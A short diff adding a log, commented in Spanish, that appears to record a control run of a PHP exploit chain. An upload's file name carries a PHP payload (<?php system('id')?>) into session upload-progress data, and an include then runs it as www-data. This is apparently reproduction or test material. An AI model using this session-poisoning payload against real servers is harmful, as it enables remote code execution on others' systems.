@@ -1,0 +1,7 @@
+# control: misma cadena con la version que corrige PHP2Shell
+PHP 8.2.35 (cli) (built: Oct 28 2026 01:29:54) (NTS)
+# subida colgada y nota en la sesion
+[1] 35330
+upload_progress_pwn|a:5:{s:10:"start_time";i:1793618517;s:14:"content_length";i:400339;s:15:"bytes_processed";i:25881;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:24:"<?php system('id')?>.txt";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1793618517;s:15:"bytes_processed";i:25595;}}}
+# ejecucion mediante include
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
